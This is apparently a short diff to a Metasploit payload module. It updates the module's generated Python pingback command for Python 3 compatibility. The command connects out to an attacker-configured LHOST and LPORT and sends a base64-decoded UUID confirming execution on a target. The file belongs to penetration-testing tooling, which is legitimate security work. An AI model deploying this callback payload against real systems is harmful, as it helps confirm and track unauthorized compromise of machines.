@@ -33,11 +33,12 @@ module MetasploitModule
   def command_string
     self.pingback_uuid ||= self.generate_pingback_uuid
     cmd = <<~PYTHON
+      import binascii as b
       import socket as s
       o=s.socket(s.AF_INET,s.SOCK_STREAM)
       try:
        o.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
-       o.send('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.decode('base64'))
+       o.send(b.a2b_base64('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'))
        o.close()
       except:
        pass
